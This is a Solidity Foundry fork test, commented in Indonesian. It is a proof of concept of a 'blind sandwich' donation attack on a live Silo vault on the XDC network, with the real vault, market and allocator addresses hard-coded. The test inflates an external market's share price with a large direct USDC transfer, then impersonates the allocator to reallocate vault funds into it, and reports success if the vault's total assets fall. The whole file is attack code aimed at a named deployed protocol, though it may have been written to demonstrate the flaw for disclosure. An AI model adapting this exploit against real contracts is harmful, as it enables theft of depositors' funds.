// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {IERC20} from "openzeppelin5/token/ERC20/IERC20.sol";
import {IERC4626} from "openzeppelin5/interfaces/IERC4626.sol";

// Interface untuk SiloVault
interface ISiloVault is IERC4626 {
    struct MarketAllocation {
        IERC4626 market;
        uint256 assets;
    }
    function reallocate(MarketAllocation[] calldata allocations) external;
}

contract SiloXDCForkTest is Test {
    string XDC_RPC_URL = "https://erpc.xinfin.network/"; 
    
    address constant USDC = 0xfA2958CB79b0491CC627c1557F441eF849Ca8eb1;
    address constant SILO_VAULT = 0x06083Db34F1E915FA5cd4e2A198f3680E3CE9c60; // 9Summits Vault
    address constant EXTERNAL_MARKET = 0xB38658B163E364DfFFDBC895f1b5d658d5e6C439; // Unverified Market
    address constant SOURCE_MARKET = 0xd1ed56Ed95c02634D9e2385A04cd5b97078dd932; // Market lain di Vault
    
    // Address Allocator (Pastikan ini valid di XDC)
    address constant ALLOCATOR = 0x8e65743e23Ed13f593E7d4eb7ED3ddE1E1cB9bBf; 

    function setUp() public {
        uint256 forkId = vm.createFork(XDC_RPC_URL);
        vm.selectFork(forkId);
    }

    function test_BlindSandwichAttackOnXDC() public {
        uint256 vaultTVLBefore = IERC4626(SILO_VAULT).totalAssets();
        console.log("Vault TVL Sebelum Serangan :", vaultTVLBefore);
        
        address attacker = address(this);
        // USDC menggunakan 6 Desimal, kita beri attacker 10 Juta USDC
        deal(USDC, attacker, 10_000_000 * 1e6); 

        console.log("\n[1] FRONT-RUN: Attacker mendonasi uang ke External Market untuk memanipulasi harga...");
        vm.startPrank(attacker);
        // Pompa harga Share Token dengan mengirim 5 Juta USDC langsung (Spot Balance Attack)
        IERC20(USDC).transfer(EXTERNAL_MARKET, 5_000_000 * 1e6);
        vm.stopPrank();

        console.log("\n[2] EKSEKUSI VAULT: Allocator memindahkan dana dari Source Market ke External Market...");
        vm.startPrank(ALLOCATOR);
        
        ISiloVault.MarketAllocation[] memory allocations = new ISiloVault.MarketAllocation[](2);
        
        // PERUBAHAN DI SINI: Tarik hanya 10,000 USDC dari Source Market agar tidak kena NotEnoughLiquidity
        allocations[0] = ISiloVault.MarketAllocation({
            market: IERC4626(SOURCE_MARKET),
            assets: 10_000 * 1e6 // 10 Ribu USDC
        });
        
        // Setorkan semua dana (10,000 USDC tadi) ke External Market yang sudah kita manipulasi
        allocations[1] = ISiloVault.MarketAllocation({
            market: IERC4626(EXTERNAL_MARKET),
            assets: type(uint256).max // type(max) berarti deposit semua sisa dari totalWithdrawn
        });
        
        // Eksekusi fungsi reallocate!
        ISiloVault(SILO_VAULT).reallocate(allocations);
        vm.stopPrank();

        console.log("\n[3] CEK KERUSAKAN VAULT...");
        uint256 vaultTVLAfter = IERC4626(SILO_VAULT).totalAssets();
        console.log("Vault TVL Setelah Serangan :", vaultTVLAfter);

        if (vaultTVLAfter < vaultTVLBefore) {
            console.log("\n[+] BINGO! SERANGAN SUKSES!");
            console.log("[+] Vault kehilangan:", vaultTVLBefore - vaultTVLAfter, "USDC");
            console.log("[+] Bukti konkret bahwa ketiadaan slippage protection menghancurkan dana Vault di Mainnet!");
        } else {
            console.log("\n[-] Gagal. TVL tidak berubah atau bertambah. Market mungkin kebal Flash Loan (menggunakan Oracle/Internal Accounting).");
        }
    }
}
